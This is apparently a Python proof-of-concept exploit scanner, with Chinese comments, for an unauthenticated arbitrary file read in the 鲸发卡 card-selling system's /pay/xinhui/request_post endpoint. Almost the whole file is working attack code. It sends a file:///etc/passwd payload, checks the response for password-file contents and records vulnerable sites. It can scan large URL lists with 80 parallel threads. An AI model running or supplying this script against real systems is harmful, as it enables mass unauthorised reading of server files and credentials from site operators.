# -*- coding: utf-8 -*-
# 鲸发卡系统 /pay/xinhui/request_post 任意文件读取漏洞
# body="/static/theme/maowang51/css/style.css"
# 产品简介:鲸发卡系统 致力于解决虚拟商品的快捷发卡服务，为商户及其买家 提供，便捷、绿色、安全、快速的销售和购买体验。框架已升级TP最新版本，无安全BUG，重新开发将近80％，原创功能10+项，目前是商业发卡系统比较好用的系统。
# 漏洞概述: 鲸发卡系统 /pay/xinhui/request_post 接口处存在任意文件读取漏洞，未经身份验证攻击者可通过该漏洞读取系统重要文件（如数据库配置文件、系统配置文件）、数据库配置文件等等，导致网站处于极度不安全状态。

import requests,argparse,sys
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()

def banner():
    test = """ 
\x1b[38m██████╗ ███████╗ █████╗ ██████╗         ███████╗██╗██╗     ███████╗
\x1b[36m██╔══██╗██╔════╝██╔══██╗██╔══██╗        ██╔════╝██║██║     ██╔════╝
\x1b[34m██████╔╝█████╗  ███████║██║  ██║███████╗█████╗  ██║██║     █████╗  
\x1b[35m██╔══██╗██╔══╝  ██╔══██║██║  ██║╚══════╝██╔══╝  ██║██║     ██╔══╝  
\x1b[31m██║  ██║███████╗██║  ██║██████╔╝        ██║     ██║███████╗███████╗
\x1b[33m╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚═════╝         ╚═╝     ╚═╝╚══════╝╚══════╝                                                                                                                                                    
                                        --author:Kucei
                                        --Version:鲸发卡系统 /pay/xinhui/request_post ReadFile                                               
\x1b[0m"""
    print(test)

def main():
    banner()
    parser = argparse.ArgumentParser('鲸发卡系统 /pay/xinhui/request_post ReadFile')
    parser.add_argument('-u','--url',dest='url',type=str,help='Please Input URL')
    parser.add_argument('-f','--file',dest='file',type=str,help='Please Input File')
    args = parser.parse_args()

    # 判断url/file
    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        url_list =[]
        with open(args.file,'r',encoding='utf-8') as fp:
            for i in fp.readlines():
                url_list.append(i.strip())
        pool = Pool(80)
        pool.map(poc,url_list)
        pool.close()
        pool.join()
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")

def poc(target):
    url_payload = '/pay/xinhui/request_post?url=file:///etc/passwd&post_data[1]='
    headers = {
        'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:125.0) Gecko/20100101 Firefox/125.0',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
        'Accept-Language': 'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
        'Accept-Encoding': 'gzip, deflate, br',
        'Connection': 'close'
    }
    # proxies = {'http':'http://127.0.0.1:8080','https':'http://127.0.0.1:8080',}
    data = {}
    try :
        response = requests.get(url=target+url_payload,headers=headers,verify=False,timeout=5)
        # print(response.status_code)
        # print(response.text)
        if response.status_code == 200 and ':0:0:' in response.text:
            print( f"[+] {target} 存在漏洞！\n")
            with open('鲸发卡系统_ReadFile.txt','a',encoding='utf-8')as f:
                f.write(target+url_payload+'\n')
                return True
        else:
            print("[-] 不存在漏洞！！")
            return False
    except Exception:
        print(target+"站点连接异常")


if __name__ == '__main__':
    main()